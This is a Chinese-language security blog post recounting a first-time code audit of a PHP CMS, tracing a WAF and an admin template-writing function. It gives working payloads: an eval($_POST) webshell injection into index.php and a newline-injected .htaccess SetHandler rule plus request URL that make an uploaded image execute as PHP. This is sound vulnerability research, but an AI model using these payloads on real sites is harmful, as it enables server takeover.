> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/9529)

### 前言

​ 大师傅丢给了我一个 CMS，说挺简单的，让我尝试审计看看。于是我开启了自己的第一次代码审计。这篇文章主要是讲自己写审计时的一些思路把，对于代码的分析还是比较少的。

### 工具

​ **Vscode**：用来查找内容很好评，自带的`转到定义`、`转到引用`的功能都很好用

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162622-685e7982-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162622-685e7982-acb2-1.png)

​ **Seay 源代码审计系统**：虽然有时候在喷这个工具不好用，但是它能帮我们快速定位可能存在危险的函数，可以帮我们发现一些漏掉的东西，总体来说还行啦

### 审计

​ 在把环境装好后，先试试网站前台有啥功能，可能会存在啥漏洞。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504163325-64da9074-acb3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504163325-64da9074-acb3-1.png)

​ 访问了几个页面，都存在`ID`这个 GET 请求参数，这里可以判断可能存在 SQL 注入的漏洞，进行测试

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162644-7592dcd8-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162644-7592dcd8-acb2-1.png)

​ 当加上单引号就被过滤了，emmmm 不幸的开始，这时候可以使用 VScode 看看它的 WAF 是啥样的，有没有机会绕过。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162654-7becd160-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162654-7becd160-acb2-1.png)

​ 可以知道这个 WAF 的位置是在`Include/contorl.php`文件中，并且知道了它运作的原理：当存在 GET 请求参数时，它会将 GET 请求参数保存在一个数组中，并对其中的每一个参数进行正则匹配，如果存在关键字则会返回`Sorry,You do this is wrong! (.-.)`退出脚本。

​ 又在前台逛了一下，并没有发现什么特别有用的功能 (这个 WAF 过滤的太狠了)，既然如此就去后台看看吧

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504163453-990a33d6-acb3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504163453-990a33d6-acb3-1.png)

​ 登录上来就看到了上传点，是一个很好的开始。这里我先上传了一个正常的图片，然后通过查看 Burp 的内容去寻找源代码

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162728-8fefaa52-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162728-8fefaa52-acb2-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162740-976f221c-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162740-976f221c-acb2-1.png)

​ 主要代码应该是在`Upfile.php`这个文件中，于是我们先去看看这个文件的代码

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162755-a02ab6fa-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162755-a02ab6fa-acb2-1.png)

​ 这里能看到网站的 logo 是可以上传 zip 文件的，这让我联想到了使用文件包含的 zip 协议的漏洞，然后我就上了`Seay`帮我看看有没有啥文件包含的漏洞

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162807-a76dc7f4-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162807-a76dc7f4-acb2-1.png)

​ 在一众`SQL注入`和`XSS`提示中，我找到了这个可以函数开始是一个变量的地方，毕竟如果开始是写死的 (如：`file_get_contents('../'.$xxx)`) 这样的咋们也用不了 zip 协议了，我飞快的跳去看这个函数定义以及调用它的地方

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162820-af38c434-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162820-af38c434-acb2-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162834-b71a065e-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162834-b71a065e-acb2-1.png)

​ 从这个调用中，我们可以看到`$mblujin`是不可控，它要嘛是写死的，要嘛是从数据库中查找的。但是有另外一个变量是可控的`$mb`

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504163151-2cb3ef9c-acb3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504163151-2cb3ef9c-acb3-1.png)

​ 这三步：分别是提取模板文件的数据，将其中的`<{Template}>`内容换成`$mb`的内容，然后把它写到网站根目录下

​ 这里对于`file_get_contents`使用拼接字符串十分敏感，因为可以虚构一个不存在的文件名，然后通过`../`返回上一级。测试如下

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504163058-0d365f60-acb3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504163058-0d365f60-acb3-1.png)

​ 那这里我们可以用相同的方法，将想要的内容写进去，然后返回上一级即可。既然如此就得先看看它读的是哪里的文件

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504163133-2203c4d2-acb3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504163133-2203c4d2-acb3-1.png)

​ `index.php`是从`Templete/default/Include`读到的；`.htaccess`是从`Templete/default/Include/hta/d`读到的

​ 一开始我的想法是直接将 Shell 写到`index.php`，毕竟直接在`.php`文件的基础写肯定不会错的，看看`index.php`的源码

```
<?php
include_once  '<{dirpaths}>Include/web_inc.php';
include_once  '<{dirpaths}>Templete/<{Template}>/Include/Function.php';
$file_url="<{dirpaths}>";
include_once  '<{dirpaths}>Templete/<{Template}>/Include/default.php';
?>


```

​ 这里闭合代码的话需要闭合单引号，再将后面的内容注释掉就行啦，最后接 default 是原来模板的文件夹名。

```
Payload:index.php';eval($_POST[1]);//../default


```

​ 既然构造好了就得拿上去打了

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504163213-39a829e8-acb3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504163213-39a829e8-acb3-1.png)

​ 直接访问`Function.php`文件不行，因为这里声明了一个类对象，但是并不是在该文件定义的。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504163226-415d9f38-acb3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504163226-415d9f38-acb3-1.png)

​ 通过右键转到定义，发现它是在网站根目录下的`Include/contorl.php`文件中被定义的，而这个文件最开始就是那个 WAF 过滤。淦！也就是说我们刚才构造的 Payload 不行，因为单引号会报错退出。

​ 但是还是先得找个连接这个两个文件的 php。

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504163042-03b52b10-acb3-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504163042-03b52b10-acb3-1.png)

​ 直接用搜索功能就找到了

​ 既然`index.php`文件用不了，那就转换思路，试试用`.htaccess`能不能 Getshell，还记得我们之前有一个图片上传的点，那只要将图片当作 php 文件解析即可，先看看`.htaccess`文件代码

```
RewriteEngine On
RewriteCond %{http_host} ^sem-cms.com [NC]
RewriteRule ^(.*)$ http://www.sem-cms.com/$1 [L,R=301]

<Files ~ “^.(htaccess|htpasswd)$”>
deny from all
</Files>

RewriteRule  ^product.php$  <{dirpaths}>Templete/<{Template}>/Include/product\.php
RewriteRule  ^about.php$  <{dirpaths}>Templete/<{Template}>/Include/about\.php
RewriteRule  ^contact.php$  <{dirpaths}>Templete/<{Template}>/Include/contact\.php
RewriteRule  ^download.php$  <{dirpaths}>Templete/<{Template}>/Include/download\.php
RewriteRule  ^news.php$  <{dirpaths}>Templete/<{Template}>/Include/news\.php
RewriteRule  ^info.php$  <{dirpaths}>Templete/<{Template}>/Include/info\.php
RewriteRule  ^view.php$  <{dirpaths}>Templete/<{Template}>/Include/view\.php
RewriteRule  ^search.php$  <{dirpaths}>Templete/<{Template}>/Include/search\.php
ErrorDocument 404 /Templete/<{Template}>/Include/404.html

```

​ 可以将前面的内容闭合，接着通过换行符写入我们想要的规则，最后将后面的内容使用`#`注释掉

```
Payload:index.php%0aSetHandler application/x-httpd-php%0a%23/../../default

```

​ 接着我们先上传一个图片马

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504163023-f8925172-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504163023-f8925172-acb2-1.png)

​ 接着根据返回的路径试试能不能访问

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504163005-ed5d95b4-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504163005-ed5d95b4-acb2-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162952-e5da166e-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162952-e5da166e-acb2-1.png)

​ 接着使用我们的 Payload 打一下，这里`CF=template`是因为功能点的名字 (可以看看前面的图片找到)

```
Payload:Top_include.php?CF=template&mb=index.php%0aSetHandler application/x-httpd-php%0a%23/../../default

```

​ 接着我们再次访问改图片

[![](https://xzfile.aliyuncs.com/media/upload/picture/20210504162937-dd16066e-acb2-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20210504162937-dd16066e-acb2-1.png)

​ 成功的 GetShell 了！！！

### 结语

整个审计过程，我是通过了白 + 黑的方式来看的，当看到可能存在的问题点的时候可以去看看代码，可能代码中的一些内容就会给你提示。再者就是细心吧，有些小细节还是不能放过的，像一开始当我不能利用`index.php`文件时是想放弃的，但是后来回想到了可以上传图片，又重新振作了。欢迎大家和我一起学习交流！！！